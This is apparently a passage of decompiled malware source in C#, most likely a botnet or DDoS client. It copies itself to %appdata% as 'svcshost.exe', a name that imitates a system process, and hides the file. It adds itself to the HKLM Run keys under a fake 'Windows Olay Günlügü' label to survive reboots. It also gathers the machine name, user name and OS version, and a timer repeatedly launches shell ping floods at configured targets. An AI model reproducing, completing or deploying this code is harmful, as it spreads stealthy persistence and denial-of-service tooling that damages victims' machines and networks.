					((byte*)ptr)[12] = (Conversions.ToBoolean(string_9[6]) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] != 0)
					{
						goto IL_01d8;
					}
					goto IL_01f8;
					IL_01d8:
					*(int*)((byte*)ptr + 8) = 22;
					FileSystem.SetAttr(Interaction.Environ("appdata") + "\\svcshost.exe", (FileAttribute)2);
					goto IL_01f8;
					IL_01f8:
					*(int*)((byte*)ptr + 8) = 24;
					((byte*)ptr)[12] = (Conversions.ToBoolean(string_9[4]) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] != 0)
					{
						goto IL_021a;
					}
					goto IL_0327;
					IL_021a:
					*(int*)((byte*)ptr + 8) = 25;
					((ServerComputer)Class1.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true)!.SetValue("Windows Olay Günlügü", Interaction.Environ("appdata") + "\\svcshost.exe");
					goto IL_0258;
					IL_0258:
					ProjectData.ClearProjectError();
					*(int*)ptr = -3;
					goto IL_0261;
					IL_0261:
					*(int*)((byte*)ptr + 8) = 27;
					((ServerComputer)Class1.Computer).get_Registry().get_LocalMachine().CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Olay Günlügü")
						.SetValue("Windows Olay Günlügü", Interaction.Environ("appdata") + "\\svcshost.exe");
					goto IL_0327;
					IL_02a3:
					*(int*)((byte*)ptr + 8) = 30;
					goto IL_02a9;
					IL_02a9:
					*(int*)((byte*)ptr + 8) = 31;
					((byte*)ptr)[12] = (Conversions.ToBoolean(string_9[6]) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] != 0)
					{
						goto IL_02c8;
					}
					goto IL_02d9;
					IL_02c8:
					*(int*)((byte*)ptr + 8) = 32;
					FileSystem.SetAttr(Application.get_ExecutablePath(), (FileAttribute)2);
					goto IL_02d9;
					IL_02d9:
					*(int*)((byte*)ptr + 8) = 34;
					((byte*)ptr)[12] = (Conversions.ToBoolean(string_9[4]) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] != 0)
					{
						goto IL_02f8;
					}
					goto IL_0327;
					IL_02f8:
					*(int*)((byte*)ptr + 8) = 35;
					((ServerComputer)Class1.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true)!.SetValue("Windows Olay Günlügü", Application.get_ExecutablePath());
					goto IL_0327;
					IL_0327:
					*(int*)((byte*)ptr + 8) = 38;
					((byte*)ptr)[12] = (Conversions.ToBoolean(string_9[7]) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] != 0)
					{
						goto IL_0349;
					}
					goto IL_048a;
					IL_0349:
					*(int*)((byte*)ptr + 8) = 39;
					text5 = string_9[10];
					goto IL_035a;
					IL_035a:
					*(int*)((byte*)ptr + 8) = 42;
					((byte*)ptr)[13] = ((Operators.CompareString(text5, "Critical", false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[13] != 0)
					{
						goto IL_037c;
					}
					goto IL_03a0;
					IL_037c:
					*(int*)((byte*)ptr + 8) = 43;
					Interaction.MsgBox((object)string_9[9], (MsgBoxStyle)16, (object)string_9[8]);
					goto IL_048a;
					IL_03a0:
					*(int*)((byte*)ptr + 8) = 45;
					((byte*)ptr)[13] = ((Operators.CompareString(text5, "Information", false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[13] != 0)
					{
						goto IL_03c2;
					}
					goto IL_03e6;
					IL_03c2:
					*(int*)((byte*)ptr + 8) = 46;
					Interaction.MsgBox((object)string_9[9], (MsgBoxStyle)64, (object)string_9[8]);
					goto IL_048a;
					IL_03e6:
					*(int*)((byte*)ptr + 8) = 48;
					((byte*)ptr)[13] = ((Operators.CompareString(text5, "Question", false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[13] != 0)
					{
						goto IL_0408;
					}
					goto IL_0429;
					IL_0408:
					*(int*)((byte*)ptr + 8) = 49;
					Interaction.MsgBox((object)string_9[9], (MsgBoxStyle)32, (object)string_9[8]);
					goto IL_048a;
					IL_0429:
					*(int*)((byte*)ptr + 8) = 51;
					((byte*)ptr)[13] = ((Operators.CompareString(text5, "Exclamation", false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[13] != 0)
					{
						goto IL_044b;
					}
					goto IL_046c;
					IL_044b:
					*(int*)((byte*)ptr + 8) = 52;
					Interaction.MsgBox((object)string_9[9], (MsgBoxStyle)48, (object)string_9[8]);
					goto IL_048a;
					IL_046c:
					*(int*)((byte*)ptr + 8) = 55;
					Interaction.MsgBox((object)string_9[9], (MsgBoxStyle)0, (object)string_9[8]);
					goto IL_048a;
					IL_048a:
					ProjectData.ClearProjectError();
					*(int*)ptr = -4;
					goto IL_0493;
					IL_0493:
					*(int*)((byte*)ptr + 8) = 61;
					text3 = Conversions.ToString(Registry.LocalMachine.OpenSubKey("SOFTWARE")!.OpenSubKey("Microsoft")!.OpenSubKey("Windows NT")!.OpenSubKey("CurrentVersion")!.GetValue("ProductName"));
					goto IL_04d6;
					IL_04d6:
					*(int*)((byte*)ptr + 8) = 62;
					text = Environment.MachineName + " slash " + Environment.UserName;
					goto IL_04f2;
					IL_04f2:
					*(int*)((byte*)ptr + 8) = 63;
					text2 = method_2();
					goto IL_04ff;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 66;
				method_1();
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 1836;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		method_1();
		method_0();
	}

	private void method_4(object sender, DownloadStringCompletedEventArgs e)
	{
		Application.DoEvents();
	}

	private void method_5(object sender, UploadStringCompletedEventArgs e)
	{
		Application.DoEvents();
	}

	private unsafe void Timer2_Tick(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[13];
		int try0006_dispatch = -1;
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 522:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 4:
							goto IL_0030;
						case 5:
							goto IL_0035;
						case 3:
						case 6:
						case 7:
							goto IL_0058;
						case 9:
							goto IL_0079;
						case 10:
							goto IL_007f;
						case 8:
						case 11:
						case 12:
							goto IL_00a3;
						case 14:
							goto IL_00c5;
						case 15:
							goto IL_00cb;
						case 13:
						case 16:
						case 17:
							goto IL_00ef;
						case 19:
							goto IL_0111;
						case 20:
							goto IL_0117;
						case 18:
						case 21:
						case 22:
							goto IL_013b;
						case 24:
							goto IL_015d;
						case 25:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 23:
						case 26:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_015d:
					*(int*)((byte*)ptr + 8) = 24;
					break;
					IL_013b:
					*(int*)((byte*)ptr + 8) = 22;
					((byte*)ptr)[12] = ((Operators.CompareString(string_8, (string)null, false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] != 0)
					{
						goto end_IL_0006_3;
					}
					goto IL_015d;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					((byte*)ptr)[12] = ((Operators.CompareString(string_4, (string)null, false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] == 0)
					{
						goto IL_0030;
					}
					goto IL_0058;
					IL_0030:
					*(int*)((byte*)ptr + 8) = 4;
					goto IL_0035;
					IL_0035:
					*(int*)((byte*)ptr + 8) = 5;
					Interaction.Shell("ping " + string_4 + "-165000", (AppWinStyle)0, false, -1);
					goto IL_0058;
					IL_0058:
					*(int*)((byte*)ptr + 8) = 7;
					((byte*)ptr)[12] = ((Operators.CompareString(string_5, (string)null, false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] == 0)
					{
						goto IL_0079;
					}
					goto IL_00a3;
					IL_0079:
					*(int*)((byte*)ptr + 8) = 9;
					goto IL_007f;
					IL_007f:
					*(int*)((byte*)ptr + 8) = 10;
					Interaction.Shell("ping " + string_5 + "-165000", (AppWinStyle)0, false, -1);
					goto IL_00a3;
					IL_00a3:
					*(int*)((byte*)ptr + 8) = 12;
					((byte*)ptr)[12] = ((Operators.CompareString(string_6, (string)null, false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] == 0)
					{
						goto IL_00c5;
					}
					goto IL_00ef;
					IL_00c5:
					*(int*)((byte*)ptr + 8) = 14;
					goto IL_00cb;
					IL_00cb:
					*(int*)((byte*)ptr + 8) = 15;
					Interaction.Shell("ping " + string_6 + "-165000", (AppWinStyle)0, false, -1);
					goto IL_00ef;
					IL_00ef:
					*(int*)((byte*)ptr + 8) = 17;
					((byte*)ptr)[12] = ((Operators.CompareString(string_7, (string)null, false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] == 0)
					{
						goto IL_0111;
					}
					goto IL_013b;
					IL_0111:
					*(int*)((byte*)ptr + 8) = 19;
					goto IL_0117;
					IL_0117:
					*(int*)((byte*)ptr + 8) = 20;
					Interaction.Shell("ping " + string_7 + "-165000", (AppWinStyle)0, false, -1);
					goto IL_013b;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 25;
				Interaction.Shell("ping " + string_8 + "-165000", (AppWinStyle)0, false, -1);
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 522;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
